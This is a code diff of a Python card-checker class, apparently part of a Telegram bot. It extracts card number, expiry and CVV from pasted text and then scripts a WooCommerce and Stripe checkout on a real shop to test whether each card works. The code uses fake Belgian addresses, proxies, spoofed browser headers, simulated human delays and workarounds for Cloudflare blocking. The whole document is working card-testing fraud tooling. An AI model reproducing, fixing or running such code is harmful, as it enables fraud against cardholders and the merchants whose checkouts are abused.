@@ -191,46 +191,33 @@ def check_cooldown(user_id, command_type="xx"):
 
     return True, 0
 
-# ========== INTELLIGENT CARD PARSING (Adapted from shopify054.py) ==========
+# ========== INTELLIGENT CARD PARSING ==========
 def strip_all_unicode(text):
     """
     Remove ALL Unicode characters, keep only ASCII (letters, numbers, basic punctuation)
     """
-    # Normalize unicode characters to ASCII where possible
     try:
-        # First, try to normalize using NFKD form which decomposes unicode characters
         normalized = unicodedata.normalize('NFKD', text)
-        # Then encode to ASCII, ignoring errors, and decode back
         ascii_text = normalized.encode('ASCII', 'ignore').decode('ASCII')
     except:
-        # Fallback: manually filter out non-ASCII characters
         ascii_text = ''.join(char for char in text if ord(char) < 128)
     
-    # Keep only digits, letters, pipes, spaces, commas, slashes, and hyphens
-    # This preserves card separators while removing decorative characters
     cleaned = re.sub(r'[^0-9a-zA-Z\|\s,\/\-]', ' ', ascii_text)
-    
-    # Replace multiple spaces with single space
     cleaned = re.sub(r'\s+', ' ', cleaned)
     
     return cleaned.strip()
 
 def extract_card_from_cleaned_text(text):
-    """
-    Extract card details from cleaned ASCII text
-    """
-    # Pattern 1: Standard format with pipe (cc|mm|yy|cvv)
+    """Extract card details from cleaned ASCII text"""
     pattern1 = r'(\d{13,16})\s*[|\s]\s*(\d{1,2})\s*[|\s]\s*(\d{2,4})\s*[|\s]\s*(\d{3,4})'
     match = re.search(pattern1, text)
     if match:
         cc, mes, ano, cvv = match.groups()
-        # Normalize year
         if len(ano) == 4:
             ano = ano[-2:]
         mes = mes.zfill(2)
         return [cc, mes, ano, cvv]
     
-    # Pattern 2: Space or comma separated (cc mm yy cvv) or (cc,mm,yy,cvv)
     pattern2 = r'(\d{13,16})\s*[, ]\s*(\d{1,2})\s*[, ]\s*(\d{2,4})\s*[, ]\s*(\d{3,4})'
     match = re.search(pattern2, text)
     if match:
@@ -240,46 +227,38 @@ def extract_card_from_cleaned_text(text):
         mes = mes.zfill(2)
         return [cc, mes, ano, cvv]
     
-    # Pattern 3: Find all digit sequences and try to find valid card
     digits = re.findall(r'\d+', text)
     
-    # Try to find a valid card sequence
     for i in range(len(digits) - 3):
         potential_cc = digits[i]
         potential_mes = digits[i+1]
         potential_ano = digits[i+2]
         potential_cvv = digits[i+3]
         
-        # Check if this looks like a valid card
         if (13 <= len(potential_cc) <= 16 and 
             len(potential_mes) in [1, 2] and 
             len(potential_ano) in [2, 4] and 
             len(potential_cvv) in [3, 4]):
             
-            # Validate month
             try:
                 mes_int = int(potential_mes)
                 if 1 <= mes_int <= 12:
-                    # Validate year (not too far in past/future)
                     current_year = datetime.now().year % 100
                     
-                    # Handle 4-digit year
                     if len(potential_ano) == 4:
                         ano_val = int(potential_ano) % 100
                     else:
                         ano_val = int(potential_ano)
                     
-                    # Year should be within reasonable range (current year to +10 years)
                     if current_year - 5 <= ano_val <= current_year + 10:
                         cc = potential_cc
                         mes = potential_mes.zfill(2)
-                        ano = potential_ano[-2:]  # Always take last 2 digits
+                        ano = potential_ano[-2:]
                         cvv = potential_cvv
                         return [cc, mes, ano, cvv]
             except:
                 continue
     
-    # Pattern 4: Look for card number followed by expiry and CVV with labels
     pattern4 = r'[Cc]ard:?\s*(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
     match = re.search(pattern4, text, re.IGNORECASE | re.DOTALL)
     if match:
@@ -289,7 +268,6 @@ def extract_card_from_cleaned_text(text):
         mes = mes.zfill(2)
         return [cc, mes, ano, cvv]
     
-    # Pattern 5: Generic pattern with slashes for dates
     pattern5 = r'(\d{13,16}).*?(\d{1,2})[\/\-](\d{2,4}).*?(\d{3,4})'
     match = re.search(pattern5, text, re.DOTALL)
     if match:
@@ -302,20 +280,15 @@ def extract_card_from_cleaned_text(text):
     return None
 
 def parse_card_input(card_input):
-    """
-    Parse card input by first stripping ALL Unicode, then extracting card details
-    """
-    # Step 1: Strip all Unicode characters
+    """Parse card input by first stripping ALL Unicode, then extracting card details"""
     cleaned_text = strip_all_unicode(card_input)
     
-    # Step 2: Extract card from cleaned text
     result = extract_card_from_cleaned_text(cleaned_text)
     if result:
         return result
     
-    # Step 3: If still no result, try filter.py as fallback
     if FILTER_AVAILABLE:
-        all_cards, unique_cards = extract_cards(card_input)  # Use original for filter
+        all_cards, unique_cards = extract_cards(card_input)
         if unique_cards:
             card_parts = unique_cards[0].split('|')
             if len(card_parts) == 4:
@@ -325,7 +298,6 @@ def parse_card_input(card_input):
                 mes = mes.zfill(2)
                 return [cc, mes, ano, cvv]
     
-    # Step 4: Last resort - try direct split on original
     if '|' in card_input:
         parts = card_input.split('|')
         if len(parts) >= 4:
@@ -365,7 +337,7 @@ class StripeCharge012Checker:
         self.product_id = "32989"
         self.variation_id = "43020"
         
-        # Belgium address data (from network data)
+        # Belgium address data
         self.belgium_addresses = [
             {
                 "first_name": "Billy",
@@ -424,22 +396,19 @@ class StripeCharge012Checker:
             r'pi_[a-zA-Z0-9]+_secret_',
         ]
 
-        # User agent for proxy
         self.user_id = user_id
         
         # Proxy management
         self.proxy_url = None
-        self.proxy_status = "Dead 🚫"  # Default status
+        self.proxy_status = "Dead 🚫"
         self.proxy_used = False
         self.proxy_response_time = 0.0
         
-        # Session storage - FIX: Initialize cookies dict properly
+        # Session storage
         self.cookies = {}
-        self.cookie_jar = {}  # Store cookies from all responses
+        self.cookie_jar = {}
         self.checkout_nonce = None
         self.update_order_review_nonce = None
-        
-        # FIX: Track stripe session IDs from cookies (from network data)
         self.stripe_mid = None
         self.stripe_sid = None
         
@@ -492,7 +461,7 @@ class StripeCharge012Checker:
         return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')
 
     def get_base_headers(self):
-        """Get base headers mimicking browser - FIX: Updated to match network data"""
+        """Get base headers mimicking browser"""
         return {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'Accept-Encoding': 'gzip, deflate, br, zstd',
@@ -510,29 +479,24 @@ class StripeCharge012Checker:
             'User-Agent': self.user_agent,
         }
 
-    # FIX: New helper method to build cookie string from stored cookies
     def _build_cookie_header(self):
         """Build cookie header string from stored cookie jar"""
         if not self.cookie_jar:
             return ""
         return "; ".join([f"{k}={v}" for k, v in self.cookie_jar.items()])
 
-    # FIX: New helper method to update cookie jar from response
     def _update_cookies_from_response(self, response):
         """Extract and store cookies from response headers"""
         if response.headers:
-            # Try multiple ways to get Set-Cookie headers (httpx compatibility)
             set_cookie_headers = []
             for key, value in response.headers.items():
                 if key.lower() == 'set-cookie':
                     set_cookie_headers.append(value)
             
             for cookie_str in set_cookie_headers:
-                # Parse cookie name=value
                 cookie_parts = cookie_str.split(';')[0].strip()
                 if '=' in cookie_parts:
                     name, value = cookie_parts.split('=', 1)
-                    # URL decode the cookie value
                     try:
                         from urllib.parse import unquote
                         value = unquote(value)
@@ -540,7 +504,6 @@ class StripeCharge012Checker:
                         pass
                     self.cookie_jar[name] = value
                     
-                    # FIX: Track Stripe cookies
                     if name == '__stripe_mid':
                         self.stripe_mid = value
                         logger.cookie(f"Got stripe_mid: {value[:20]}...")
@@ -552,7 +515,6 @@ class StripeCharge012Checker:
                     elif 'woocommerce' in name.lower():
                         logger.cookie(f"Got WooCommerce cookie: {name}")
         
-        # Also check cookies from httpx response.cookies
         if hasattr(response, 'cookies') and response.cookies:
             for name, value in response.cookies.items():
                 self.cookie_jar[name] = value
@@ -561,13 +523,8 @@ class StripeCharge012Checker:
         """Get BIN information with safe None handling"""
         if not cc or len(cc) < 6:
             return {
-                'scheme': 'N/A',
-                'type': 'N/A',
-                'brand': 'N/A',
-                'bank': 'N/A',
-                'country': 'N/A',
-                'country_code': 'N/A',
-                'emoji': '🏳️'
+                'scheme': 'N/A', 'type': 'N/A', 'brand': 'N/A',
+                'bank': 'N/A', 'country': 'N/A', 'country_code': 'N/A', 'emoji': '🏳️'
             }
 
         bin_number = cc[:6]
@@ -607,66 +564,48 @@ class StripeCharge012Checker:
             logger.warning(f"BIN lookup failed: {e}")
 
         default_response = {
-            'scheme': 'N/A',
-            'type': 'N/A',
-            'brand': 'N/A',
-            'bank': 'N/A',
-            'country': 'N/A',
-            'country_code': 'N/A',
-            'emoji': '🏳️'
+            'scheme': 'N/A', 'type': 'N/A', 'brand': 'N/A',
+            'bank': 'N/A', 'country': 'N/A', 'country_code': 'N/A', 'emoji': '🏳️'
         }
         self.bin_cache[bin_number] = default_response
         return default_response
 
     def trim_error_message(self, message):
-        """Trim error message to remove unnecessary prefixes, suffixes, and trailing punctuation"""
+        """Trim error message"""
         if not message:
             return message
         
-        # Remove HTML tags first
         message = re.sub(r'<[^>]+>', '', message).strip()
-        
-        # Remove "Payment Failed" prefix variations
         message = re.sub(r'^Payment\s+Failed\s*\(?\s*', '', message, flags=re.IGNORECASE)
         message = re.sub(r'^Payment\s+Error\s*\(?\s*', '', message, flags=re.IGNORECASE)
         message = re.sub(r'^Error\s*:\s*', '', message, flags=re.IGNORECASE)
         message = re.sub(r'^There\s+was\s+an\s+error\s*:\s*', '', message, flags=re.IGNORECASE)
-        
-        # Remove "Refresh and try again" variations
         message = re.sub(r'\.?\s*Refresh\s+and\s+try\s+again\.?$', '', message, flags=re.IGNORECASE)
         message = re.sub(r'\.?\s*Please\s+try\s+again\.?$', '', message, flags=re.IGNORECASE)
         message = re.sub(r'\.?\s*Try\s+again\.?$', '', message, flags=re.IGNORECASE)
+        message = re.sub(r'\)\.?$', '', message)
+        message = re.sub(r'\.$', '', message)
+        message = message.rstrip('. )').strip()
         
-        # Remove trailing periods, spaces, and parentheses
-        message = re.sub(r'\)\.?$', '', message)  # Remove trailing ) or ). 
-        message = re.sub(r'\.$', '', message)     # Remove trailing single period
-        message = message.rstrip('. )').strip()  # Remove trailing periods, spaces, and )
-        
-        # Remove parentheses if they wrap the entire message
         if message.startswith('(') and message.endswith(')'):
             message = message[1:-1].strip()
         
-        # Clean up any double spaces
         message = re.sub(r'\s+', ' ', message).strip()
         
         return message
 
     def extract_error_from_html(self, html_content):
-        """Extract error message from HTML response and trim it"""
+        """Extract error message from HTML response"""
         if not html_content:
             return "Payment declined"
         
-        # Pattern for woocommerce error
         pattern = r'<li>\s*There was an error processing the payment:\s*(.*?)\s*<\/li>'
         match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
         if match:
             error_text = match.group(1).strip()
             error_text = re.sub(r'<[^>]+>', '', error_text).strip()
-            # Trim the message
-            error_text = self.trim_error_message(error_text)
-            return error_text
+            return self.trim_error_message(error_text)
         
-        # Alternative pattern
         pattern2 = r'woocommerce-error[^>]*>.*?<li>(.*?)<\/li>'
         match2 = re.search(pattern2, html_content, re.IGNORECASE | re.DOTALL)
         if match2:
@@ -674,9 +613,7 @@ class StripeCharge012Checker:
             error_text = re.sub(r'<[^>]+>', '', error_text).strip()
             if "there was an error processing the payment:" in error_text.lower():
                 error_text = error_text.split(":", 1)[-1].strip()
-            # Trim the message
-            error_text = self.trim_error_message(error_text)
-            return error_text
+            return self.trim_error_message(error_text)
         
         return "Payment declined"
 
@@ -698,15 +635,19 @@ class StripeCharge012Checker:
         return False
 
     def extract_nonces_from_html(self, html_content):
-        """Extract all required nonces from checkout page HTML - FIX: More robust patterns"""
+        """Extract all required nonces from checkout page HTML"""
         nonces = {}
         
         if not html_content:
             logger.warning("Empty HTML content for nonce extraction")
             return nonces
         
-        # Log HTML size for debugging
         logger.debug_response(f"HTML size: {len(html_content)} chars")
+        
+        # FIX: Only extract if HTML is large enough (real page, not cache stub)
+        if len(html_content) < 500:
+            logger.warning(f"HTML too small ({len(html_content)} chars) - likely cache/block page, not real checkout")
+            return nonces
         
         # Pattern 1: Standard hidden input field
         checkout_nonce_match = re.search(
@@ -715,9 +656,9 @@ class StripeCharge012Checker:
         )
         if checkout_nonce_match:
             nonces['checkout_nonce'] = checkout_nonce_match.group(1)
-            logger.success(f"Extracted checkout nonce (pattern 1): {nonces['checkout_nonce']}")
+            logger.success(f"Extracted checkout nonce: {nonces['checkout_nonce']}")
         
-        # Pattern 2: Alternative quotes (single quotes)
+        # Pattern 2: single quotes
         if 'checkout_nonce' not in nonces:
             checkout_nonce_match2 = re.search(
                 r"name='woocommerce-process-checkout-nonce'\s+value='([a-f0-9]{10})'",
@@ -725,9 +666,9 @@ class StripeCharge012Checker:
             )
             if checkout_nonce_match2:
                 nonces['checkout_nonce'] = checkout_nonce_match2.group(1)
-                logger.success(f"Extracted checkout nonce (pattern 2): {nonces['checkout_nonce']}")
+                logger.success(f"Extracted checkout nonce (single quotes): {nonces['checkout_nonce']}")
         
-        # Pattern 3: Look for it in JSON/javascript
+        # Pattern 3: JSON format
         if 'checkout_nonce' not in nonces:
             checkout_nonce_match3 = re.search(
                 r'woocommerce-process-checkout-nonce["\']?\s*[=:]\s*["\']([a-f0-9]{10})["\']',
@@ -735,79 +676,31 @@ class StripeCharge012Checker:
             )
             if checkout_nonce_match3:
                 nonces['checkout_nonce'] = checkout_nonce_match3.group(1)
-                logger.success(f"Extracted checkout nonce (pattern 3): {nonces['checkout_nonce']}")
-        
-        # Pattern 4: Generic nonce search - look for any 10-char hex near 'checkout'
-        if 'checkout_nonce' not in nonces:
-            generic_match = re.search(
-                r'checkout[^>]*?([a-f0-9]{10})',
-                html_content,
-                re.IGNORECASE
-            )
-            if generic_match:
-                nonces['checkout_nonce'] = generic_match.group(1)
-                logger.warning(f"Using generic checkout nonce: {nonces['checkout_nonce']}")
+                logger.success(f"Extracted checkout nonce (JSON): {nonces['checkout_nonce']}")
         
         # Extract update_order_review nonce
-        # Pattern 1: In wc_checkout_params
         security_match = re.search(
             r'update_order_review_nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']',
             html_content
         )
         if security_match:
             nonces['update_order_review_nonce'] = security_match.group(1)
-            logger.success(f"Extracted update_order_review nonce (pattern 1): {nonces['update_order_review_nonce']}")
+            logger.success(f"Extracted update_order_review nonce: {nonces['update_order_review_nonce']}")
         
-        # Pattern 2: Alternative wc_checkout_params format
         if 'update_order_review_nonce' not in nonces:
             security_match2 = re.search(
-                r'var\s+wc_checkout_params\s*=\s*\{[^}]*"update_order_review_nonce"\s*:\s*"([a-f0-9]{10})"',
+                r'"security"\s*[=:]\s*["\']([a-f0-9]{10})["\']',
                 html_content
             )
             if security_match2:
                 nonces['update_order_review_nonce'] = security_match2.group(1)
-                logger.success(f"Extracted update_order_review nonce (pattern 2): {nonces['update_order_review_nonce']}")
-        
-        # Pattern 3: Look for any 10-char hex near 'security' or 'nonce'
-        if 'update_order_review_nonce' not in nonces:
-            security_match3 = re.search(
-                r'"security"\s*[=:]\s*["\']([a-f0-9]{10})["\']',
-                html_content
-            )
-            if security_match3:
-                nonces['update_order_review_nonce'] = security_match3.group(1)
-                logger.success(f"Extracted security nonce (pattern 3): {nonces['update_order_review_nonce']}")
-        
-        # Pattern 4: Generic nonce near 'update_order_review'
-        if 'update_order_review_nonce' not in nonces:
-            security_match4 = re.search(
-                r'update_order_review[^>]*?([a-f0-9]{10})',
-                html_content,
-                re.IGNORECASE
-            )
-            if security_match4:
-                nonces['update_order_review_nonce'] = security_match4.group(1)
-                logger.warning(f"Using generic security nonce: {nonces['update_order_review_nonce']}")
-        
-        # If still no checkout_nonce, try to find ANY nonce value in the page
-        if 'checkout_nonce' not in nonces:
-            # Look for any hidden input with "nonce" in the name
-            any_nonce = re.search(r'name="[^"]*nonce[^"]*"\s+value="([a-f0-9]{10})"', html_content)
-            if any_nonce:
-                nonces['checkout_nonce'] = any_nonce.group(1)
-                logger.warning(f"Using any-nonce as checkout nonce: {nonces['checkout_nonce']}")
-            else:
-                # Last resort: find any 10-char hex value
-                any_hex = re.search(r'"([a-f0-9]{10})"', html_content)
-                if any_hex:
-                    nonces['checkout_nonce'] = any_hex.group(1)
-                    logger.warning(f"Last resort - using any 10-char hex: {nonces['checkout_nonce']}")
+                logger.success(f"Extracted security nonce: {nonces['update_order_review_nonce']}")
         
         logger.debug_response(f"Extracted nonces: {nonces}")
         return nonces
 
     async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
-        """Format response matching scharge1.py style with trimmed message"""
+        """Format response matching scharge1.py style"""
         if bin_info is None:
             bin_info = await self.get_bin_info(cc)
         
@@ -825,7 +718,6 @@ class StripeCharge012Checker:
         first_name = html.escape(str(user_data.get("first_name", "User")))
         badge = user_data.get("plan", {}).get("badge", "🧿")
 
-        # Trim the message for display
         trimmed_message = self.trim_error_message(str(message)) if message else ""
 
         if any(pattern in trimmed_message.lower() for pattern in ["3d secure", "authentication required", "3ds", "requires_confirmation", "requires_action"]):
@@ -839,7 +731,6 @@ class StripeCharge012Checker:
         else:
             status_emoji = "❌"
             status_text = "DECLINED"
-            # Use trimmed message
             message_display = trimmed_message if trimmed_message else "Payment declined"
 
         clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
@@ -867,7 +758,7 @@ class StripeCharge012Checker:
         return response
 
     def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
-        """Get processing message matching scharge1.py style"""
+        """Get processing message"""
         return f"""<b>「$cmd → /xx」| <b>WAYNE</b> </b>
 ━━━━━━━━━━━━━━━
 <b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
@@ -880,29 +771,28 @@ class StripeCharge012Checker:
 <b>Checking card... Please wait.</b>"""
 
     async def human_delay(self, min_delay=0.5, max_delay=1.5):
-        """Simulate human delay between actions"""
+        """Simulate human delay"""
         delay = random.uniform(min_delay, max_delay)
         await asyncio.sleep(delay)
 
     async def make_request_with_retry(self, method, url, max_retries=3, **kwargs):
-        """Make request with retry logic for VPS compatibility - FIX: Proper cookie handling"""
+        """Make request with retry logic"""
         last_exception = None
         
         for attempt in range(max_retries):
             try:
                 if attempt > 0:
                     logger.warning(f"Retry attempt {attempt + 1}/{max_retries} for {url}")
-                    await asyncio.sleep(1.5 * attempt)  # Exponential backoff
+                    await asyncio.sleep(1.5 * attempt)
                 
                 headers = kwargs.get('headers', {}).copy()
                 
-                # Merge with base headers
                 base_headers = self.get_base_headers()
                 for key, value in base_headers.items():
                     if key not in headers:
                         headers[key] = value
                 
-                # FIX: Set appropriate Sec-Fetch-Site based on URL
+                # Set appropriate Sec-Fetch-Site
                 if self.base_url.replace('https://', '') in url:
                     if 'Referer' in headers:
                         headers['Sec-Fetch-Site'] = 'same-origin'
@@ -913,12 +803,11 @@ class StripeCharge012Checker:
                     headers['Sec-Fetch-Dest'] = 'empty'
                     headers['Sec-Fetch-Mode'] = 'cors'
                 
-                # FIX: Add cookie header from cookie jar
+                # Add cookie header
                 cookie_str = self._build_cookie_header()
                 if cookie_str:
                     headers['Cookie'] = cookie_str
                 
-                # Update dynamic headers
                 headers['User-Agent'] = self.user_agent
                 headers['Accept-Language'] = self.accept_language
                 
@@ -926,7 +815,6 @@ class StripeCharge012Checker:
 
                 response = await self.client.request(method, url, **kwargs)
                 
-                # FIX: Update cookie jar from response
                 self._update_cookies_from_response(response)
                 
                 return response
@@ -949,19 +837,18 @@ class StripeCharge012Checker:
         raise last_exception if last_exception else Exception("All retry attempts failed")
 
     async def initialize_session(self):
-        """Initialize session with proper cookies and proxy - FIX: Accept 200, 202, 302"""
+        """Initialize session - FIX: Visit homepage first to get initial cookies"""
         try:
-            logger.step(1, 6, "Initializing session...")
+            logger.step(1, 7, "Initializing session (homepage)...")
 
             response = await self.make_request_with_retry('GET', f"{self.base_url}/")
 
-            # FIX: Accept 200, 202, and 302 as valid responses
             if response.status_code in [200, 202, 302]:
-                logger.success(f"Session initialized successfully (status: {response.status_code})")
+                logger.success(f"Homepage loaded (status: {response.status_code})")
                 logger.network(f"Cookies collected: {len(self.cookie_jar)}")
                 return True
             else:
-                logger.error(f"Failed with status {response.status_code}")
+                logger.error(f"Homepage failed with status {response.status_code}")
                 return False
 
         except Exception as e:
@@ -969,9 +856,9 @@ class StripeCharge012Checker:
             return False
 
     async def add_product_to_cart(self):
-        """Add product to cart using multipart form data - FIX: More robust with retry on failure"""
+        """Add product to cart"""
         try:
-            logger.step(2, 6, "Adding product to cart...")
+            logger.step(2, 7, "Adding product to cart...")
 
             # Load product page first with proper referer
             product_headers = {
@@ -984,14 +871,12 @@ class StripeCharge012Checker:
             }
             response = await self.make_request_with_retry('GET', self.product_url, headers=product_headers)
 
-            # FIX: Accept 200, 202, 302 as valid
             if response.status_code not in [200, 202, 302]:
                 logger.warning(f"Product page returned {response.status_code}, attempting add to cart anyway...")
 
-            # Add a small human delay
             await self.human_delay(0.5, 1.0)
             
-            # Add to cart using multipart form data (from network data)
+            # Add to cart using multipart form data
             boundary = f"----WebKitFormBoundary{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"
             
             cart_data = (
@@ -1032,13 +917,11 @@ class StripeCharge012Checker:
 
             response = await self.make_request_with_retry('POST', self.product_url, headers=add_headers, content=cart_data.encode())
 
-            # FIX: Accept 200, 202, 302 as valid
             if response.status_code in [200, 202, 302]:
                 logger.success("Product added to cart successfully")
                 return True, None
             else:
-                logger.warning(f"Add to cart returned status: {response.status_code}")
-                # Try once more with a fresh request
+                logger.warning(f"Add to cart returned status: {response.status_code}, retrying...")
                 await asyncio.sleep(1)
                 response = await self.make_request_with_retry('POST', self.product_url, headers=add_headers, content=cart_data.encode())
                 if response.status_code in [200, 202, 302]:
@@ -1050,10 +933,38 @@ class StripeCharge012Checker:
             logger.error(f"Add to cart error: {str(e)}")
             return False, f"Add to cart error: {str(e)}"
 
-    async def get_checkout_page(self):
-        """Load checkout page and extract nonces - FIX: Better retry, accept more status codes, save HTML for debugging"""
+    async def visit_cart_page(self):
+        """FIX: NEW METHOD - Visit cart page to get proper WooCommerce session cookies"""
         try:
-            logger.step(3, 6, "Loading checkout page...")
+            logger.step(3, 7, "Visiting cart page...")
+
+            cart_headers = {
+                "Referer": self.product_url,
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "same-origin",
+                "Sec-Fetch-User": "?1",
+                "Upgrade-Insecure-Requests": "1",
+            }
+
+            response = await self.make_request_with_retry('GET', f"{self.base_url}/cart/", headers=cart_headers)
+
+            if response.status_code in [200, 202, 302]:
+                logger.success(f"Cart page loaded (status: {response.status_code})")
+                logger.network(f"Cookies after cart: {len(self.cookie_jar)}")
+                return True, None
+            else:
+                logger.warning(f"Cart page returned status: {response.status_code}, but proceeding...")
+                return True, None  # Proceed anyway
+
+        except Exception as e:
+            logger.warning(f"Cart page error: {str(e)}, proceeding anyway...")
+            return True, None  # Proceed anyway
+
+    async def get_checkout_page(self):
+        """Load checkout page and extract nonces - FIX: Added minimum HTML size check"""
+        try:
+            logger.step(4, 7, "Loading checkout page...")
 
             checkout_headers = {
                 "Referer": f"{self.base_url}/cart/",
@@ -1064,15 +975,12 @@ class StripeCharge012Checker:
                 "Upgrade-Insecure-Requests": "1",
             }
 
-            # Add a human delay before loading checkout
             await self.human_delay(0.3, 0.8)
             
             response = await self.make_request_with_retry('GET', f"{self.base_url}/checkout/", headers=checkout_headers, max_retries=2)
 
-            # FIX: Accept 200, 202, 302 AND save HTML even on non-200
             if response.status_code not in [200, 202, 302]:
                 logger.error(f"Checkout page returned status: {response.status_code}")
-                # Try once more
                 await asyncio.sleep(1.5)
                 response = await self.make_request_with_retry('GET', f"{self.base_url}/checkout/", headers=checkout_headers, max_retries=1)
                 if response.status_code not in [200, 202, 302]:
@@ -1080,11 +988,48 @@ class StripeCharge012Checker:
 
             html_content = response.text
             
-            # Log response details for debugging
             logger.debug_response(f"Checkout page status: {response.status_code}")
             logger.debug_response(f"HTML length: {len(html_content)}")
             
-            # Save HTML for debugging if nonces not found
+            # FIX: Check if HTML is large enough to be a real page
+            if len(html_content) < 500:
+                logger.warning(f"HTML too small ({len(html_content)} chars) - cache/block page detected")
+                logger.warning("Trying alternative approach to load checkout...")
+                
+                # Save for debugging
+                try:
+                    with open("DATA/checkout_debug.html", "w", encoding="utf-8") as f:
+                        f.write(html_content)
+                except:
+                    pass
+                
+                # FIX: Try with completely different headers (simulate direct visit from Google)
+                await asyncio.sleep(2)
+                alt_headers = {
+                    "Referer": "https://www.google.com/",
+                    "Sec-Fetch-Dest": "document",
+                    "Sec-Fetch-Mode": "navigate",
+                    "Sec-Fetch-Site": "cross-site",
+                    "Sec-Fetch-User": "?1",
+                    "Upgrade-Insecure-Requests": "1",
+                }
+                # Clear cookies temporarily to get fresh session
+                old_cookies = self.cookie_jar.copy()
+                self.cookie_jar = {}
+                
+                response2 = await self.make_request_with_retry('GET', f"{self.base_url}/checkout/", headers=alt_headers, max_retries=2)
+                
+                html_content2 = response2.text
+                logger.debug_response(f"Alt checkout page status: {response2.status_code}, HTML length: {len(html_content2)}")
+                
+                if len(html_content2) < 500:
+                    # Restore old cookies
+                    self.cookie_jar = old_cookies
+                    return False, "Checkout page blocked - Cloudflare/cache returning stub page (178 bytes)"
+                
+                html_content = html_content2
+            
+            # Save for debugging if nonces not found
             if 'woocommerce-process-checkout-nonce' not in html_content:
                 logger.warning("Checkout nonce NOT found in HTML - saving for debug")
                 try:
@@ -1103,48 +1048,22 @@ class StripeCharge012Checker:
             if 'update_order_review_nonce' in nonces:
                 self.update_order_review_nonce = nonces['update_order_review_nonce']
             
-            # If still no nonces, try a second request with different approach
-            if not self.checkout_nonce and not self.update_order_review_nonce:
-                logger.warning("No nonces found on first attempt, trying alternative checkout URL...")
-                await asyncio.sleep(2)
-                
-                # Try with different headers (simulate coming from Google)
-                alt_headers = {
-                    "Referer": "https://www.google.com/",
-                    "Sec-Fetch-Dest": "document",
-                    "Sec-Fetch-Mode": "navigate",
-                    "Sec-Fetch-Site": "cross-site",
-                    "Sec-Fetch-User": "?1",
-                    "Upgrade-Insecure-Requests": "1",
-                }
-                response2 = await self.make_request_with_retry('GET', f"{self.base_url}/checkout/", headers=alt_headers, max_retries=1)
-                
-                if response2.status_code in [200, 202, 302]:
-                    html_content2 = response2.text
-                    nonces2 = self.extract_nonces_from_html(html_content2)
-                    if 'checkout_nonce' in nonces2:
-                        self.checkout_nonce = nonces2['checkout_nonce']
-                    if 'update_order_review_nonce' in nonces2:
-                        self.update_order_review_nonce = nonces2['update_order_review_nonce']
-            
             if self.checkout_nonce or self.update_order_review_nonce:
                 logger.success(f"Checkout page loaded - Checkout nonce: {self.checkout_nonce}, Update nonce: {self.update_order_review_nonce}")
                 return True, None
             else:
-                # Even without nonces, we can try to proceed (some checkout flows may work)
-                logger.warning("No nonces extracted, but proceeding anyway...")
-                return True, "No nonces found but proceeding"
+                logger.error("No nonces found in HTML - checkout page may not have loaded properly")
+                return False, "Could not extract nonces from checkout page"
 
         except Exception as e:
             logger.error(f"Checkout page error: {str(e)}")
             return False, f"Checkout page error: {str(e)}"
 
     async def update_order_review(self, user_info):
-        """Update order review with Belgium address and local pickup"""
+        """Update order review with Belgium address"""
         try:
-            logger.step(4, 6, "Updating order review...")
+            logger.step(5, 7, "Updating order review...")
             
-            # Ensure we have the required nonce
             if not self.update_order_review_nonce:
                 logger.warning("Missing update_order_review_nonce, attempting to get from checkout page")
                 success, error = await self.get_checkout_page()
@@ -1152,22 +1071,15 @@ class StripeCharge012Checker:
                     return False, f"Failed to get checkout page: {error}"
                 
                 if not self.update_order_review_nonce:
-                    # If still missing, try one more time
-                    await asyncio.sleep(1)
-                    success, error = await self.get_checkout_page()
-                    if not success or not self.update_order_review_nonce:
-                        # FIX: Try to proceed without nonce if we have checkout_nonce
-                        if self.checkout_nonce:
-                            logger.warning("Proceeding without update_order_review_nonce, using checkout_nonce as security")
-                            self.update_order_review_nonce = self.checkout_nonce
-                        else:
-                            return False, "Could not extract any nonces from checkout page"
+                    if self.checkout_nonce:
+                        logger.warning("Using checkout_nonce as security nonce")
+                        self.update_order_review_nonce = self.checkout_nonce
+                    else:
+                        return False, "Could not extract any nonces from checkout page"
 
-            # Build post_data exactly as in network data
             current_time = datetime.now()
             session_start = current_time.strftime('%Y-%m-%d %H:%M:%S')
             
-            # URL encode the user agent - FIX: match network data format exactly
             user_agent_encoded = self.user_agent.replace(' ', '%20')
             user_agent_encoded = user_agent_encoded.replace('(', '%28').replace(')', '%29').replace(';', '%3B')
             
@@ -1260,22 +1172,9 @@ class StripeCharge012Checker:
                     logger.success("Order review updated (non-JSON response)")
                     return True, None
             elif response.status_code == 403:
-                logger.error(f"403 Forbidden - Possible Cloudflare block or missing nonce")
-                logger.warning("Retrying with fresh checkout page...")
-                await asyncio.sleep(2)
-                
-                success, error = await self.get_checkout_page()
-                if success and self.update_order_review_nonce:
-                    post_data['security'] = self.update_order_review_nonce
-                    
-                    response = await self.make_request_with_retry('POST', f"{self.base_url}/?wc-ajax=update_order_review", headers=update_headers, data=post_data)
-                    
-                    if response.status_code == 200:
-                        return True, None
-                
-                return False, f"403 Forbidden - Site may be blocking automated requests"
+                logger.error(f"403 Forbidden - Possible Cloudflare block")
+                return False, f"403 Forbidden"
             else:
-                # FIX: Accept non-200 responses and try to proceed
                 logger.warning(f"Update order review returned {response.status_code}, trying to proceed...")
                 return True, None
 
@@ -1284,23 +1183,18 @@ class StripeCharge012Checker:
             return False, f"Update order review error: {str(e)}"
 
     async def create_stripe_payment_method(self, card_details, user_info):
-        """Create Stripe payment method - FIX: Use stored cookies, wallet_config_id"""
+        """Create Stripe payment method"""
         try:
             cc, mes, ano, cvv = card_details
 
-            logger.step(5, 6, "Creating payment method...")
+            logger.step(6, 7, "Creating payment method...")
 
-            # Generate GUIDs (from network data format)
